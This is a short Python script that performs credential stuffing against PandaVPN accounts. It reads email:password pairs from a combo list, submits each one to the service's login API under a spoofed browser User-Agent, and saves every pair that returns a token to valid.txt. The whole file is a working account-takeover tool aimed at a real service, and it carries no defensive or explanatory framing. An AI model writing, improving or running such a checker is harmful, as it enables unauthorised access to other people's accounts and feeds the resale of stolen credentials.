import requests
import time

def check_panda(email, password):
    url = "https://api.pandavpn.com/v1/user/login"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/json"
    }
    data = {
        "email": email,
        "password": password
    }

    try:
        res = requests.post(url, json=data, headers=headers)
        if "token" in res.text:
            print(f"[VALID] {email}:{password}")
            with open("valid.txt", "a") as f:
                f.write(f"{email}:{password}\n")
        else:
            print(f"[INVALID] {email}:{password}")
    except Exception as e:
        print(f"[ERROR] {email}:{password} → {str(e)}")

def main():
    with open("combo.txt", "r") as f:
        combos = f.read().splitlines()

    for combo in combos:
        if ":" in combo:
            email, password = combo.strip().split(":", 1)
            check_panda(email, password)
            time.sleep(1)

if __name__ == "__main__":
    main()
